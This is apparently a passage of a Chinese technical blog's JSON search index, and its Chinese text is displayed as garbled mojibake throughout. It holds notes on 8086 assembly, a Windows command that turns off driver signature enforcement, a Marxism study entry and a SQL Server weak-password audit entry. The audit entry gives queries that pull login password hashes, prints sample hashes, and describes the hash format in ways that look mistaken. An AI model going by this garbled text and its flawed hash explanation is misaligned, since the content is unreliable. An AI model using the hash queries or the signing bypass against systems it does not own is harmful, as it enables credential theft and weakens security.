”/æ”¿æ²»/è¿‘ç°ä»£å²çº²è¦","permalink":"https://hodlyounger.github.io/categories/A-A%E7%A0%94/%E6%94%BF%E6%B2%BB/%E8%BF%91%E7%8E%B0%E4%BB%A3%E5%8F%B2%E7%BA%B2%E8%A6%81/"}]},{"title":"ã€æ±‡ç¼–ã€‘ã€å®éªŒæ¥¼ã€‘æ±‡ç¼–æ•™ç¨‹ç¬”è®°","date":"2024-08-24T13:33:55.196Z","path":"B_Code/æ±‡ç¼–/ã€æ±‡ç¼–ã€‘ã€å®éªŒæ¥¼ã€‘æ±‡ç¼–æ•™ç¨‹ç¬”è®°/","text":"æ¦‚è¿°ï¼š DOS åŠ DEBUG ä»‹ç» 8086 å¯„å­˜å™¨ç»„ 8086 å¯„å­˜å™¨éƒ½æ˜¯ 16 ä½çš„å¯„å­˜å™¨ï¼Œæ ¹æ®ç”¨é€”å¯åˆ†ä¸º 4 ç§ç±»å‹ã€‚åˆ†åˆ«æ˜¯æ•°æ®å¯„å­˜å™¨ã€åœ°å€å¯„å­˜å™¨ã€æ®µå¯„å­˜å™¨å’Œæ§åˆ¶å¯„å­˜å™¨ã€‚ å¦‚å›¾æ‰€ç¤º: ï¼ˆ1ï¼‰æ•°æ®å¯„å­˜å™¨ æ•°æ®å¯„å­˜å™¨ä¸­æ¯ä¸ªå¯„å­˜å™¨åˆå¯ä»¥åˆ†ä¸º 2 ä¸ª 8 ä½çš„å¯„å­˜å™¨ã€‚åˆ†åˆ«ä¸º AHã€ALï¼ŒBHã€BLï¼ŒCHã€CLï¼ŒDHã€DLã€‚H è¡¨ç¤ºé«˜å­—èŠ‚ï¼ˆé«˜ 8 ä½ï¼‰å¯„å­˜å™¨ã€L è¡¨ç¤ºä½å­—èŠ‚ï¼ˆä½ 8 ä½ï¼‰å¯„å­˜å™¨ã€‚ ä¾‹å¦‚ï¼šç”¨ AX å¯„å­˜å™¨å­˜æ”¾ä¸€ä¸ªå­— 1234Hï¼Œè¡¨ç¤ºä¸º (AX)=1234Hï¼Œå³é«˜å­—èŠ‚ 12 æ”¾åœ¨ AHï¼Œä½å­—èŠ‚ 34 æ”¾åœ¨ AL ä¸­ã€‚ ï¼ˆ2ï¼‰åœ°å€å¯„å­˜å™¨ åœ°å€å¯„å­˜å™¨åŒ…æ‹¬æŒ‡é’ˆå’Œå˜å€å¯„å­˜å™¨ SPã€BPã€SIã€DI å››ä¸ª 16 ä½å¯„å­˜å™¨ã€‚ é¡¾åæ€ä¹‰ï¼Œå®ƒä»¬å¯ç”¨æ¥å­˜æ”¾å­˜å‚¨å™¨æ“ä½œæ•°çš„åç§»åœ°å€ã€‚å¦å¤–ï¼Œå®ƒä»¬ä¹Ÿå¯ä»¥ä½œä¸ºé€šç”¨å¯„å­˜å™¨ç”¨ã€‚ ï¼ˆ3ï¼‰æ®µå¯„å­˜å™¨ 8086CPU æœ‰ 4 ä¸ª 16 ä½çš„æ®µå¯„å­˜å™¨ï¼Œåˆ†åˆ«æ˜¯ CS ä»£ç æ®µå¯„å­˜å™¨ã€DS æ•°æ®æ®µå¯„å­˜å™¨ã€ES é™„åŠ æ®µå¯„å­˜å™¨ã€SS å †æ ˆæ®µå¯„å­˜å™¨ã€‚ ï¼ˆ4ï¼‰æ§åˆ¶å¯„å­˜å™¨ æ§åˆ¶å¯„å­˜å™¨åŒ…æ‹¬ IP å’Œ FLAGSï¼ˆåˆç§°ä¸º PSW ç¨‹åºçŠ¶æ€å­—ï¼‰ä¸¤ä¸ª 16 ä½å¯„å­˜å™¨ï¼Œç”¨äºæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œã€‚ IP æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ï¼Œç”¨æ¥å­˜æ”¾ä»£ç æ®µä¸­çš„åç§»åœ°å€ï¼ŒæŒ‡å‡ºå½“å‰æ­£åœ¨æ‰§è¡ŒæŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤æ‰€åœ¨å•å…ƒçš„åç§»åœ°å€ã€‚ FLAGS æ ‡å¿—å¯„å­˜å™¨ä¸­çš„æŸä½ä»£è¡¨ CPU çš„ 1 ä¸ªæ ‡å¿—ï¼Œè¡¨ç¤ºå‡º CPU çš„æŸç§æ‰§è¡ŒçŠ¶æ€ã€‚æœ€ä½ä½ä¸º D0ï¼Œæœ€é«˜ä½ä¸º D15ã€‚8086CPU çš„æ ‡å¿—å¯„å­˜å™¨å…±æœ‰ 9 ä¸ªæ ‡å¿—ï¼Œåˆ†åˆ«ä¸º 6 ä¸ªæ¡ä»¶ç æ ‡å¿—å’Œ 3 ä¸ªæ§åˆ¶æ ‡å¿—ã€‚å¦‚å›¾ï¼š ï¼ˆ1ï¼‰æ¡ä»¶ç æ ‡å¿— CF è¿›ä½æ ‡å¿—ã€‚å½“æŒ‡ä»¤æ‰§è¡Œç»“æœçš„æœ€é«˜ä½å‘å‰æœ‰è¿›ä½æ—¶ï¼ŒCF=1ï¼Œå¦åˆ™ CF=0ã€‚ SF ç¬¦å·æ ‡å¿—ã€‚å½“æŒ‡ä»¤æ‰§è¡Œç»“æœçš„æœ€é«˜ä½ï¼ˆç¬¦å·ä½ï¼‰ä¸ºè´Ÿæ—¶ï¼ŒSF=1ï¼Œå¦åˆ™ SF=0ã€‚ ZF é›¶æ ‡å¿—ã€‚å½“æŒ‡ä»¤æ‰§è¡Œç»“æœä¸º 0 æ—¶ï¼ŒZF=1ï¼Œç»“æœä¸ä¸º 0 æ—¶ï¼ŒZF=0ã€‚ OF æº¢å‡ºæ ‡å¿—ã€‚å½“æŒ‡ä»¤æ‰§è¡Œç»“æœæœ‰æº¢å‡ºï¼ˆè¶…å‡ºäº†æ•°çš„è¡¨ç¤ºèŒƒå›´ï¼‰æ—¶ï¼ŒOF=1ï¼Œå¦åˆ™ OF=0ã€‚ AF è¾…åŠ©è¿›ä½æ ‡å¿—ã€‚å½“æŒ‡ä»¤æ‰§è¡Œç»“æœçš„ç¬¬ 3 ä½ï¼ˆåŠå­—èŠ‚ï¼‰å‘å‰æœ‰è¿›ä½æ—¶ï¼ŒAF=1ï¼Œå¦åˆ™ AF=0ã€‚ PF å¥‡å¶æ ‡å¿—ã€‚å½“æŒ‡ä»¤æ‰§è¡Œç»“æœä¸­ 1 çš„ä¸ªæ•°ä¸ºå¶æ•°ä¸ªæ—¶ï¼ŒPF=1ï¼Œå¦åˆ™ PF=0ã€‚ ï¼ˆ2ï¼‰æ§åˆ¶æ ‡å¿— DF æ–¹å‘æ ‡å¿—ã€‚æ‰§è¡Œä¸²å¤„ç†æŒ‡ä»¤æ—¶ï¼Œè‹¥è®¾ç½® DF=0ï¼Œå­˜å‚¨å•å…ƒçš„åœ°å€å¯„å­˜å™¨çš„å€¼è‡ªåŠ¨å¢åŠ ï¼Œè‹¥è®¾ç½® DF=1ï¼Œå­˜å‚¨å•å…ƒçš„åœ°å€å¯„å­˜å™¨çš„å€¼è‡ªåŠ¨å‡å°ã€‚ IF ä¸­æ–­æ ‡å¿—ã€‚è®¾ç½® IF=1ï¼Œå…è®¸ CPU å“åº”å¯å±è”½ä¸­æ–­ï¼ŒIF=0 åˆ™ä¸å“åº”ã€‚ TF é™·é˜±æ ‡å¿—ã€‚åœ¨ DEBUG è°ƒè¯•æ—¶ï¼ŒTF=1ï¼Œé‡‡ç”¨å•æ­¥æ‰§è¡Œæ–¹å¼ï¼Œå³è¿›å…¥é™·é˜±ï¼›TF=0ï¼Œæ­£å¸¸æ‰§è¡Œç¨‹åºã€‚ ä¾‹ï¼šä¸¤ä¸ªäºŒè¿›åˆ¶æ•°ç›¸åŠ è¿ç®—ï¼Œæœ‰å…³æ ‡å¿—ä½è‡ªåŠ¨å‘ç”Ÿå˜åŒ–ã€‚ æ ¹æ®è®¡ç®—ç»“æœå¯çŸ¥ CPU ä¼šè‡ªåŠ¨åœ°æŠŠæ ‡å¿—ä½è®¾ä¸ºï¼šCF=0ï¼ŒSF=1ï¼ŒZF=0ï¼ŒOF=0ï¼ŒPF=0ï¼Œå³æ— è¿›ä½ï¼Œç»“æœä¸ºè´Ÿæ•°ï¼Œç»“æœä¸ä¸º 0ï¼Œæ²¡æœ‰æº¢å‡ºï¼Œå¥‡æ•°ä¸ª 1ã€‚ å¯¹æº¢å‡ºçš„åˆ¤æ–­ä¹Ÿå¯ä»¥ä»ç®€å•çš„è§’åº¦ç†è§£ï¼Œå› ä¸ºè¿›è¡Œè¿ç®—çš„äºŒè¿›åˆ¶æ•°æ˜¯è¡¥ç ï¼Œå¯çœ‹å‡ºæœ¬é¢˜æ˜¯ä¸€ä¸ªè´Ÿæ•°å’Œä¸€ä¸ªæ­£æ•°ç›¸åŠ ï¼Œç»“æœä¸ºè´Ÿæ•°ï¼Œä¸æº¢å‡ºã€‚è‹¥ä¸¤ä¸ªæ­£æ•°ç›¸åŠ ï¼Œç»“æœä¸ºè´Ÿæ•°ï¼Œæˆ–è€…ä¸¤ä¸ªè´Ÿæ•°ç›¸åŠ ï¼Œç»“æœä¸ºæ­£æ•°ï¼Œé‚£éƒ½æ˜¯æº¢å‡ºäº†ï¼Œè¯´æ˜ 8 ä½è¡¥ç å·²ç»è¡¨ç¤ºä¸äº†è¯¥ç»“æœã€‚ å°è´´å£« DEBUG ä¸‹çš„æ ‡å¿—ä½è¡¨ç¤º åœ¨ DEBUG è°ƒè¯•ç¯å¢ƒä¸‹ä»¥å­—æ¯ç¼©å†™çš„å½¢å¼è¡¨ç¤ºå„ä¸ªæ ‡å¿—ä½çš„çŠ¶æ€ã€‚è¿›å…¥ DEBUG åï¼Œç”¨ R å‘½ä»¤æŸ¥çœ‹å¯„å­˜å™¨çŠ¶æ€æ—¶ï¼Œå¯ä»¥çœ‹åˆ°é™¤äº†é™·é˜±æ ‡å¿—ä»¥å¤–çš„æ ‡å¿—ä½çš„çŠ¶æ€ã€‚ å¦‚è¡¨ 2-1 æ‰€ç¤ºï¼š å°è´´å£« æ•°çš„è¡¥ç è¿ç®— åœ¨è®¡ç®—æœºä¸­ï¼Œå¯¹å¸¦ç¬¦å·æ•°å¯ç”¨çœŸå€¼å’Œæœºå™¨æ•°ä¸¤ä¸ªæ¦‚å¿µè¡¨ç¤ºã€‚ çœŸå€¼ï¼Œå°±æ˜¯å¸¦æœ‰â€œ+â€ã€â€œ-â€å·çš„å®é™…æ•°å€¼ï¼›æ‰€è°“æœºå™¨æ•°ï¼Œåˆ™æ˜¯æŠŠâ€œ+â€ã€â€œ-â€ç¬¦å·æ•°å€¼åŒ–ï¼ˆ0ã€1ï¼‰åæ‰€å¾—åˆ°çš„è®¡ç®—æœºå®é™…èƒ½è¡¨ç¤ºçš„æ•°ã€‚ æœºå™¨æ•°æœ‰ä¸‰ç§ç è¡¨ç¤ºï¼Œåˆ†åˆ«æ˜¯åŸç ã€åç å’Œè¡¥ç ã€‚æ±‡ç¼–è¯­è¨€ä¸­ï¼Œæ•°éƒ½æ˜¯ä»¥è¡¥ç çš„å½¢å¼è¡¨ç¤ºçš„ï¼Œå› æ­¤å¿…é¡»æŒæ¡æ•°çš„è¡¥ç è¡¨ç¤ºå’Œè¡¥ç çš„è¿ç®—ã€‚è¿™ä¸‰ç§ç çš„å®šä¹‰å¦‚ä¸‹ï¼š åŸç ã€‚åŸç å°†æœ€é«˜ä½ä½œä¸ºç¬¦å·ä½ï¼Œæ­£æ•°ä¸º 0ï¼Œè´Ÿæ•°ä¸º 1ï¼Œå…¶ä½™ 7 ä½ä½œä¸ºæ•°å€¼ä½ã€‚ åç ã€‚æ­£æ•°çš„åç ä¸æ­£æ•°çš„åŸç ä¸€æ ·ã€‚è€Œæ±‚è´Ÿæ•°çš„åç æ—¶ï¼Œç¬¦å·ä½ä¸º 1ï¼Œæ•°å€¼ä½åœ¨åŸç çš„åŸºç¡€ä¸Šæ±‚åã€‚ è¡¥ç ã€‚æ­£æ•°çš„è¡¥ç ä¸æ­£æ•°çš„åŸç ä¸€æ ·ã€‚æ±‚è´Ÿæ•°çš„è¡¥ç æ—¶ï¼Œç¬¦å·ä½ä¸º 1ï¼Œæ•°å€¼ä½åœ¨åŸç çš„åŸºç¡€ä¸Šæ±‚ååŠ  1ã€‚ ä¾‹ï¼šåè¿›åˆ¶æ•° +5 å’Œ -5 åˆ†åˆ«è¡¨ç¤ºæˆäºŒè¿›åˆ¶æ•°åŸç ã€åç å’Œè¡¥ç ã€‚ 1234[+5]åŸ = [+5]å = [+5]è¡¥ = 00000101B [-5]åŸ = 10000101B [-5]å = 11111010B [-5]è¡¥ = 11111011B","tags":[{"name":"æ±‡ç¼–","slug":"æ±‡ç¼–","permalink":"https://hodlyounger.github.io/tags/%E6%B1%87%E7%BC%96/"},{"name":"å®éªŒæ¥¼","slug":"å®éªŒæ¥¼","permalink":"https://hodlyounger.github.io/tags/%E5%AE%9E%E9%AA%8C%E6%A5%BC/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"æ±‡ç¼–","slug":"B-Code/æ±‡ç¼–","permalink":"https://hodlyounger.github.io/categories/B-Code/%E6%B1%87%E7%BC%96/"}]},{"title":"ã€æ±‡ç¼–ã€‘æ±‡ç¼–å¯¼è¯»","date":"2024-08-24T13:33:41.508Z","path":"B_Code/æ±‡ç¼–/ã€æ±‡ç¼–ã€‘æ±‡ç¼–å¯¼è¯»/","text":"æ¦‚è¿°ï¼šæ±‡ç¼–ç›¸å…³çŸ¥è¯†ã€æ–‡ç« æ•´ç† æ–‡ç« æ¨è åŸºç¡€ CodeMachine - Article - X64 Deep Dive An Introduction to Bypassing User Mode EDR Hooks x64 ABI çº¦å®š | Microsoft Learn åœ¨çº¿å®éªŒç¯å¢ƒ æ±‡ç¼–è¯­è¨€ï¼ˆç¬¬ 2 ç‰ˆï¼Œéƒ‘æ™“è–‡è‘—ï¼‰é…å¥—å®éªŒ_å¤§å­¦å…¬å¼€è¯¾ - è“æ¡¥äº‘è¯¾","tags":[{"name":"æ±‡ç¼–","slug":"æ±‡ç¼–","permalink":"https://hodlyounger.github.io/tags/%E6%B1%87%E7%BC%96/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"æ±‡ç¼–","slug":"B-Code/æ±‡ç¼–","permalink":"https://hodlyounger.github.io/categories/B-Code/%E6%B1%87%E7%BC%96/"}]},{"title":"ã€é©±åŠ¨ã€‘ç¦ç”¨ç­¾å","date":"2024-08-24T13:12:27.817Z","path":"A_OS/Windows/é©±åŠ¨/ã€é©±åŠ¨ã€‘ç¦ç”¨ç­¾å/","text":"æ–¹æ³•ä¸€ï¼šä½¿ç”¨å‘½ä»¤æç¤ºç¬¦ é¦–å…ˆï¼ŒæŒ‰ä¸‹Win+Xç»„åˆé”®ï¼Œé€‰æ‹©â€œå‘½ä»¤æç¤ºç¬¦ï¼ˆç®¡ç†å‘˜ï¼‰â€ã€‚ åœ¨å‘½ä»¤æç¤ºç¬¦çª—å£ä¸­ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤å¹¶æŒ‰ä¸‹å›è½¦é”®ï¼Œå¼€å¯ [[Win10 æµ‹è¯•æ¨¡å¼]] 1bcdedit /set testsigning on ç³»ç»Ÿä¼šæ˜¾ç¤ºâ€œæ“ä½œæˆåŠŸå®Œæˆâ€çš„æç¤ºä¿¡æ¯ï¼Œè¡¨ç¤ºå·²æˆåŠŸç¦ç”¨é©±åŠ¨ç­¾åã€‚ é‡æ–°å¯åŠ¨ç”µè„‘ï¼Œå³å¯ç”Ÿæ•ˆã€‚ ç°åœ¨ï¼Œä½ å·²ç»æˆåŠŸç¦ç”¨äº†Win10çš„é©±åŠ¨ç­¾åé™åˆ¶ï¼Œå¯ä»¥è‡ªç”±å®‰è£…éå®˜æ–¹æˆ–æœªç»è®¤è¯çš„é©±åŠ¨ç¨‹åºäº†ï¼ä½†æ˜¯è¯·æ³¨æ„ï¼Œç¦ç”¨é©±åŠ¨ç­¾åå¯èƒ½ä¼šå¸¦æ¥ä¸€å®šçš„å®‰å…¨é£é™©ï¼Œæ‰€ä»¥åœ¨å®‰è£…é©±åŠ¨ç¨‹åºæ—¶ï¼Œè¯·ç¡®ä¿æ¥æºå¯é ï¼Œå¹¶åŠæ—¶æ¢å¤é©±åŠ¨ç­¾åä»¥ä¿è¯ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚ å¸Œæœ›æœ¬æ–‡çš„æ•™ç¨‹èƒ½å¤Ÿå¸®åŠ©åˆ°å¤§å®¶ï¼Œè®©ä½ çš„ç”µè„‘æ›´åŠ è‡ªç”±çµæ´»ã€‚å¦‚æœä½ æœ‰ä»»ä½•é—®é¢˜æˆ–è€…å»ºè®®ï¼Œæ¬¢è¿åœ¨è¯„è®ºåŒºç•™è¨€ï¼Œæˆ‘ä¼šå°½åŠ›è§£ç­”ã€‚ç¥å¤§å®¶ä½¿ç”¨æ„‰å¿«ï¼","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"é©±åŠ¨","slug":"A-OS/Windows/é©±åŠ¨","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/"}]},{"title":"ã€ç½‘å®‰ã€‘ç½‘ç»œå®¡è®¡","date":"2024-08-24T02:03:52.147Z","path":"B_Code/ç½‘ç»œç¼–ç¨‹/ç½‘å®‰/ç½‘ç»œå®¡è®¡/ã€ç½‘å®‰ã€‘ç½‘ç»œå®¡è®¡/","text":"æ¦‚è¿°ï¼šç½‘ç»œå®¡è®¡çš„è¯´æ˜ã€æ–‡ç« æ¨èç›¸å…³æ•´ç† æ–‡ç« æ¨è åŸºç¡€ Internet Censorship (Part 1): The Technology of the Working Web | Townsend Center for the Humanities Internet Censorship (Part 2): The Technology of Information Control | Townsend Center for the Humanities Bypass How to: Understand and Circumvent Network Censorship | Surveillance Self-Defense","tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://hodlyounger.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"ç½‘ç»œå®‰å…¨/ç½‘ç»œå®¡è®¡","slug":"ç½‘ç»œå®‰å…¨-ç½‘ç»œå®¡è®¡","permalink":"https://hodlyounger.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-%E7%BD%91%E7%BB%9C%E5%AE%A1%E8%AE%A1/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"ç½‘ç»œç¼–ç¨‹","slug":"B-Code/ç½‘ç»œç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"ç½‘å®‰","slug":"B-Code/ç½‘ç»œç¼–ç¨‹/ç½‘å®‰","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/%E7%BD%91%E5%AE%89/"},{"name":"ç½‘ç»œå®¡è®¡","slug":"B-Code/ç½‘ç»œç¼–ç¨‹/ç½‘å®‰/ç½‘ç»œå®¡è®¡","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/%E7%BD%91%E5%AE%89/%E7%BD%91%E7%BB%9C%E5%AE%A1%E8%AE%A1/"}]},{"title":"ã€è€ƒç ”æ”¿æ²»ã€‘é©¬åŸç¬”è®°","date":"2024-08-22T01:00:34.657Z","path":"A_Aç ”/æ”¿æ²»/é©¬åŸ/ã€è€ƒç ”æ”¿æ²»ã€‘é©¬åŸç¬”è®°/","text":"æ¦‚è¿°ï¼šé©¬åŸåˆ·é¢˜ç¬”è®° è‘—ä½œç›¸å…³ ğŸ”ç²¾è®²å‡ºå¤„ï¼šP2ï¼Œè€ƒç‚¹2-æ‹“å±•ä¸ç‚¹æ‹¨â‘£ ğŸ”ç®€æï¼š 1844å¹´8æœˆåº•ï¼Œé©¬å…‹æ€ã€æ©æ ¼æ–¯åœ¨å·´é»ä¼šé¢ã€‚æ­¤å‰ä»–ä»¬æ›¾æœ‰è¿‡ä¸€é¢ä¹‹ç¼˜ï¼Œä½†è¿™æ¬¡ä¼šé¢ä½¿ä»–ä»¬å‘ç°å½¼æ­¤çš„åŸºæœ¬è§‚ç‚¹å®Œå…¨ä¸€è‡´ï¼Œå¹¶ä»æ­¤å¼€å§‹äº†æ¯•ç”Ÿçš„åˆä½œã€‚1844å¹´9æœˆè‡³11æœˆï¼Œä»–ä»¬åœ¨å·´é»åˆå†™äº†ã€Šç¥åœ£å®¶æ—ã€‹ä¸€ä¹¦ï¼ˆç¬¬ä¸€æ¬¡åˆä½œçš„è‘—ä½œï¼‰ï¼Œæ‰¹åˆ¤é’å¹´é»‘æ ¼å°”æ´¾çš„ä¸»è§‚å”¯å¿ƒä¸»ä¹‰ã€‚æ¥ç€åˆåœ¨å¸ƒé²å¡å°”åˆå†™äº†ã€Šå¾·æ„å¿—æ„è¯†å½¢æ€ã€‹ã€‚ã€Šå¾·æ„å¿—æ„è¯†å½¢æ€ã€‹é¦–æ¬¡ç³»ç»Ÿé˜è¿°äº†å†å²å”¯ç‰©ä¸»ä¹‰çš„åŸºæœ¬è§‚ç‚¹ï¼Œå®ç°äº†å†å²è§‚ä¸Šçš„ä¼Ÿå¤§å˜é©ã€‚ ã€Šå“²å­¦çš„è´«å›°ã€‹æ˜¯1847å¹´é©¬å…‹æ€ä¸ºæ‰¹åˆ¤è’²é²ä¸œçš„ã€Šè´«å›°çš„å“²å­¦ã€‹è€Œå†™çš„è‘—ä½œã€‚è¿™éƒ¨é‡è¦çš„è‘—ä½œæ˜¯é©¬å…‹æ€ä¸»ä¹‰å­¦è¯´æœ€æ—©å‘è¡¨çš„æ–‡æœ¬ã€‚é©¬å…‹æ€ä¸»ä¹‰çš„æ–°ä¸–ç•Œè§‚ä¸é©¬å…‹æ€ä¸»ä¹‰ç»æµç§‘å­¦çš„â€œå†³å®šæ€§çš„ä¸œè¥¿â€ï¼Œéƒ½æ˜¯é€šè¿‡è¿™ä¸€æ–‡æœ¬ç¬¬ä¸€æ¬¡å…¬å¼€é—®ä¸–çš„ã€‚ ã€Šå…±äº§å…šå®£è¨€ã€‹å‘è¡¨äº1848å¹´ï¼Œæ ‡å¿—ç€é©¬å…‹æ€ä¸»ä¹‰çš„å…¬å¼€é—®ä¸–ã€‚ ğŸ”ç‚¹æ‹¨ï¼š 1876â€”1878å¹´ï¼Œæ©æ ¼æ–¯å†™å‡ºäº†ã€Šåæœæ—è®ºã€‹ï¼Œå…¨é¢é˜è¿°äº†é©¬å…‹æ€ä¸»ä¹‰ç†è®ºä½“ç³»ï¼ˆ2020å¹´çœŸé¢˜ç¬¬1é¢˜è€ƒç‚¹ï¼‰ã€‚é©¬å…‹æ€é€ä¸–åï¼Œæ©æ ¼æ–¯æ’°å†™äº†ã€Šå®¶åº­ã€ç§æœ‰åˆ¶å’Œå›½å®¶çš„èµ·æºã€‹ã€Šè·¯å¾·ç»´å¸ŒÂ·è´¹å°”å·´å“ˆå’Œå¾·å›½å¤å…¸å“²å­¦çš„ç»ˆç»“ã€‹ç­‰è‘—ä½œï¼Œè¿›ä¸€æ­¥å‘å±•äº†é©¬å…‹æ€ä¸»ä¹‰ç†è®ºã€‚","tags":[],"categories":[{"name":"A_Aç ”","slug":"A-Aç ”","permalink":"https://hodlyounger.github.io/categories/A-A%E7%A0%94/"},{"name":"æ”¿æ²»","slug":"A-Aç ”/æ”¿æ²»","permalink":"https://hodlyounger.github.io/categories/A-A%E7%A0%94/%E6%94%BF%E6%B2%BB/"},{"name":"é©¬åŸ","slug":"A-Aç ”/æ”¿æ²»/é©¬åŸ","permalink":"https://hodlyounger.github.io/categories/A-A%E7%A0%94/%E6%94%BF%E6%B2%BB/%E9%A9%AC%E5%8E%9F/"}]},{"title":"ã€å¼±å¯†ç ã€‘SQLServer","date":"2024-08-20T03:05:27.012Z","path":"wiki/å¼±å¯†ç /ã€å¼±å¯†ç ã€‘SQLServer/","text":"æ¦‚è¿°ï¼šSQLServer å¼±å¯†ç æ£€æµ‹ ç›¸å…³æ¨èï¼š mssql_4n6 | Forensicist MDF æ–‡ä»¶ç»“æ„è¯´æ˜ SQLServer ç”¨æˆ· æŸ¥è¯¢ç”¨æˆ· 1234SELECT name AS LoginName, type_desc AS LoginType, create_date, modify_dateFROM sys.server_principalsWHERE type IN (&#x27;S&#x27;, &#x27;U&#x27;, &#x27;G&#x27;, &#x27;R&#x27;)ORDER BY LoginName; æŸ¥è¯¢æ•°æ®åº“ç‰©ç†æ–‡ä»¶ä½ç½® 12345678USE master;GOSELECT df.name AS LogicalName, df.physical_name AS PhysicalLocation, df.type_desc AS FileTypeFROM sys.database_files df; æŸ¥è¯¢ç™»å½•ç”¨æˆ·çš„ä¿¡æ¯ 123456SELECT * FROM sys.sql_logins;# æˆ–è€…ä½¿ç”¨select name AS loginName, password_hashfrom sys.sql_loginsorder by loginName; æŸ¥è¯¢ç”¨æˆ·åå’Œç”¨æˆ·hash 12345678select name, password_hashfrom sys.sql_logins;# æŸ¥è¯¢ç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼šsa 0x0200F4ACE5861FDD34791BDEBD9EF1A20AE69BF34967CB9BDFE5FB091CD85655E40A8F1EDEA6BE21225DC808BEC806D25DE47AA130AD8E1945A676A5A9EBAC3882B933425FBF##MS_PolicyEventProcessingLogin## 0x0200A294782DD50D374C864939C646EECAB60ABFBA414FD65F04FE4EE7526BD97A969D9BBCA0E37A0DBE6D0CF04EB708170A1A57ADDD6C9E6A08708B687A7155D6EBA658185D##MS_PolicyTsqlExecutionLogin## 0x0200384DAEF76AB6615AE7248DD3312C01EECA1C640E19F35ED9E6B76951FF3EA1F34FD1F23F79E70B0A4639BB09A4CDB7155CF6A3A141CCFBEEB3AF6985505751EEF3A9FDA7weakpwdsame 0x0200C359A19A3E84F06A49FD0DD1AB0DED8024DD3512473CCFF49D7F4DB8166EE721CBD82F80141B1D80AD90889F7677AC2CF9B76529C81C9347B3659FD32B6CF6113830BA40 Info Hash çš„å¯†ç è¯´æ˜ ä»¥ weakpwdsame ä¸ºä¾‹ï¼Œç”¨æˆ·åä¸º weakpwdsameï¼Œå¯†ç ä¹Ÿæ˜¯ weakpwdsameã€‚æ ¹æ® SQL æŸ¥è¯¢çš„ hash å¯†ç ï¼Œå“ˆå¸Œé•¿åº¦ä¸º 0x0200ï¼Œç›å€¼ä¸º C359A19Aã€‚hash è§„åˆ™æ˜¯ passwordsaltpasswordsaltpasswordsaltã€‚ åˆ›å»ºç”¨æˆ· æ–°å»ºç™»å½•å è®¾ç½®ç™»å½•åã€å¯†ç å’Œç­–ç•¥ ä¿®æ”¹çŠ¶æ€ hash è®¡ç®— å‚è€ƒæ–‡ç« ï¼šCalculate MD5 , SHA256, SHA512 in SQL Server 1select HASHBYTES(&#x27;SHA2_512&#x27;, &#x27;Admin@2022&#x27;); å¼€æº Sha512 TokenCore/TokenCore/crypto at ac53b38e6844ffb12deb4f049ad95ef70059273b Â· xiaotian777888/TokenCore ä½¿ç”¨ Demo 12345678void SHA256_(const uint8_t* input, size_t length, uint8_t digest[SHA256_DIGEST_LENGTH])&#123; SHA256CTX context; SHA256Init(&amp;context); SHA256Update(&amp;context, input, length); SHA256Final(&amp;context, digest);&#125; ä½¿ç”¨ C++ è¿æ¥ SQLServer è¿æ¥å­—ç¬¦ä¸² è¿æ¥å­—ç¬¦ä¸²ï¼š è¿æ¥å­—ç¬¦ä¸²è¯­æ³• - ADO.NET Provider for SQL Server | Microsoft Learn ConnectionStrings.com - Forgot that connection string? Get it here! ç›¸å…³ DLL å’Œé©±åŠ¨ ä½¿ç”¨ ODBC è¿æ¥ SQLServer æ—¶ä½¿ç”¨çš„ DLL ä¸º odbc32.dll 1#define SQLSRV_ODBC_DLL &quot;odbc32.dll&quot; å¦å¤–è¿˜æœ‰ç›¸å…³ API æ¥å£è°ƒç”¨çš„ DLL 123456789101112131415161718192021 if(sql2012) &#123; driver = &quot;Driver=&#123;SQL Server Native Client 11.0&#125;;&quot;; dll = &quot;sqlncli11.dll&quot;; &#125; else if(sql2008) &#123; driver = &quot;Driver=&#123;SQL Server Native Client 10.0&#125;;&quot;; dll = &quot;sqlncli10.dll&quot;; &#125; else if(sql2005) &#123; driver = &quot;Driver=&#123;SQL Native Client&#125;;&quot;; dll = &quot;sqlncli.dll&quot;; &#125; else if(sql2000) &#123; driver = &quot;Driver=&#123;SQL Server&#125;;&quot;; dll = &quot;sqlsrv32.dll&quot;; &#125; åˆ¤æ–­ä½¿ç”¨å“ªä¸ªé©±åŠ¨å’Œ DLL æ¥å£çš„ API å‚è€ƒé¡¹ç›®ï¼š[[sqlines]] 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485// Define which SQL Server Native Client driver to usevoid DefineDriver(std::string &amp;driver, std::string &amp;dll)&#123;#if defined(WIN32) || defined(_WIN64) HKEY hKey; // Keys: SQL Server, SQL Server Native Client 10.0, SQL Server Native Client 11.0 int rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, &quot;Software\\\\ODBC\\\\ODBCINST.INI&quot;, 0, KEY_READ | KEY_ENUMERATE_SUB_KEYS, &amp;hKey); if(rc != ERROR_SUCCESS) return; char key[1024]; DWORD i = 0; bool sql2000 = false; bool sql2005 = false; bool sql2008 